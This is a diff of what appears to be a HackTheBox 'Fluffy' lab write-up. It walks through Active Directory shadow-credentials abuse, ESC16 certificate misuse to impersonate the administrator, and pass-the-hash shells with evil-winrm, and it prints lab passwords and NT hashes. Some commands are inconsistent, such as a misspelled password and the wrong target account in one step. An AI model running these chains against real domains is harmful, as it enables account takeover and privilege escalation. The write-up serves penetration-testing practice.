@@ -1,42 +1,3 @@
-Add user `p.agila` to `Service Memebers` group so i can try to generate shadow creds:
-
-`net rpc group members "Service Accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.129.2.147"`
-
-
-
-Generate "shadow credentials" option for `winrm_svc` user
-
-`./bin/python3 pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"`
-
-This saves .pfx file and prints password to stdout
-
-
-
-Recovering NT hash for winrm_svc:
-
-`certipy-ad auth -pfx unprotected.pfx -username 'winrm_svc' -domain fluffy.htb -dc-ip 10.129.2.147`
-
-to get shell
-
-`evil-winrm -i 10.129.2.147 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767`
-
-```
-Certipy v5.0.2 - by Oliver Lyak (ly4k)
-
-[*] Certificate identities:
-[*]     No identities found in this certificate
-[!] Could not find identity in the provided certificate
-[*] Using principal: 'winrm_svc@fluffy.htb'
-[*] Trying to get TGT...
-[*] Got TGT
-[*] Saving credential cache to 'winrm_svc.ccache'
-File 'winrm_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
-[*] Wrote credential cache to 'winrm_svc.ccache'
-[*] Trying to retrieve NT hash for 'winrm_svc'
-[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
-   
-```
-
 # Enumeration
 
 > To start off with we are given the following known credentials: `j.fleischman:J0elTHEM4n1990!`. It seems we can't directly winrm with these creds, so like always we can check them against LDAP and SMB.
@@ -103,6 +64,8 @@ bloodhound-python --username=p.agila --password=prometheusx-303 --domain=fluffy.
 
 
 
+## Shadow Credentials w/ Certipy
+
 > The following command will add `p.agila` to the `Service Accounts` group, giving us `GenericWrite` over `winrm_svc`. This sets us up for a shadow credentials attack which should result in us receiving the accounts' NTLM hash.
 
 ```bash
@@ -119,4 +82,130 @@ certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' 
 
 
 
-> This command will first check if the `winrm_svc` user exists and that `p.agila` has the necessary permissions on `winrm_svc` (GenericWrite, GenericAll) to perform the attack. It will then generate a new RSA key pair (private/public key) to create a self-signed certificate formatted for Active Directory. The `winrm_svc` account's `msDS-KeyCredentialLink` attribute will then be modified to contain the public key we generated before. This allows for the bypassing of password authentication by allowing for certificate authentication instead.
+> This command will first check if the `winrm_svc` user exists and that `p.agila` has the necessary permissions on `winrm_svc` (GenericWrite, GenericAll) to perform the attack. It will then generate a new RSA key pair (private/public key) to create a self-signed certificate formatted for Active Directory. The `winrm_svc` account's `msDS-KeyCredentialLink` attribute will then be modified to contain the public key we generated before. This allows for the bypassing of password authentication by allowing certificate authentication instead. Public Key Cryptography for Initial Authentication (PKINIT) is then used to take that generated public key (the certificate) to requests a Ticket Granting Ticket (TGT) for the `winrm_svc` account. Then with some method that I don't fully understand the NTLM hash for the target account can be decrypted with our generated public key (the certificate) being a main part of it.
+
+```bash
+certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+```
+
+![get da hash for winrm_svc](https://i.imgur.com/0c3A45u.png)
+
+
+
+## user.txt
+
+> We can then use this hash to authenticate and get a shell through `evil-winrm`.
+
+```bash
+evil-winrm -i 10.129.232.88 -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
+```
+
+![got user flag](https://i.imgur.com/LPmOS86.png)
+
+
+
+# Privilege Escalation
+
+> After enumerating the machine a bit more, I felt that I should be looking at more domain abuse options since that's what yielded the initial access. Taking another look at the bloodhound graphs, there are other accounts that we might be able to access through the same method, namely `ca_svc` and `ldap_svc`.
+
+## More Shadow Credentials
+
+> We will start by again adding our user `p.agila` to the `Service Accounts` group since the box resets the groups frequently. Then we will run the same command as before to automatically create shadow credentials but for the `ca_svc` account.
+
+```bash
+certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheux-303' -account ca_svc
+```
+
+![more add group](https://i.imgur.com/HRtCQz3.png)
+
+
+
+> With the NT hash for `ca_svc` we should be able to now authenticate to the system as this user. If we get more details about the account we can see that it is the Active Directory Certificate Service account for the system.
+
+```bash
+certipy-ad account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.192.252 -user 'ca_svc' read
+```
+
+![da ca account](https://i.imgur.com/IxuzwHP.png)
+
+
+
+## Template Enumeration
+
+> Normally these kinds of easy Windows boxes involves vulnerable templates, and since we have access to `ca_svc` it's probably a good idea to see what templates there are.
+
+```bash
+certipy-ad find -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.192.252 -vulnerable -stdout
+```
+
+![what templates are there](https://i.imgur.com/ssJRQwU.png)
+
+
+
+## Escalation Path 16 (ESC16)
+
+> While no vulnerable certificate templates are shown, according to the above command output the certificate authority `fluffy-DC01-CA` may be vulnerable to `ESC16`. According to [the wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally):
+
+![ESC16 wiki](https://i.imgur.com/3PzxLI5.png)
+
+
+
+> We own four accounts at this point: `j.fleischman`, `p.agila`, `winrm_svc`, and `ca_svc`. The above approach is pretty straightforward. Further down [in the wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) it even outlines the commands needed to exploit this vulnerability. We need to identify the UPN of the high-value target account, in this case it will just be `administrator`. 
+
+```bash
+certipy-ad account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.230.105 -user 'administrator' read
+```
+
+![read the admin account](https://i.imgur.com/TxoVL0a.png)
+
+
+
+> Next we will change the UPN for `ca_svc` to be `administrator`
+
+```bash
+certipy-ad account -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.129.230.105 -upn 'administrator' -user 'ca_svc' update
+```
+
+![change ca_svc upn to admin](https://i.imgur.com/cLml1tW.png)
+
+
+
+> Then we request the certificate for `ca_svc`. Since we changed the UPN to be `administrator`, and because of `ESC16`, when we request this certificate, it will be for the Administrator account. It will save a .pfx file to be used later.
+
+```bash
+certipy-ad req -dc-ip 10.129.230.105 -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+```
+
+![administrator.pfx](https://i.imgur.com/LiwvaH9.png)
+
+
+
+> We then have to change back `ca_svc`'s UPN to "ca_svc" from "administrator".
+
+```bash
+certipy-ad account -dc-ip 10.129.230.105 -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+```
+
+![change back UPN](https://i.imgur.com/HzpAVTw.png)
+
+
+
+> Lastly, we authenticate to the domain with saved `administration.pfx` to end up with the Administrator accounts hash.
+
+```bash
+certipy-ad auth -dc-ip 10.129.230.105 -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb'
+```
+
+![admin hash](https://i.imgur.com/IrKtnFb.png)
+
+
+
+## root.txt
+
+> Finally, we use can pass the administrator's hash via `evil-winrm` to get the root flag:
+
+```bash
+evil-winrm -i 10.129.230.105 -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
+```
+
+![root](https://i.imgur.com/aMvbCMS.png)
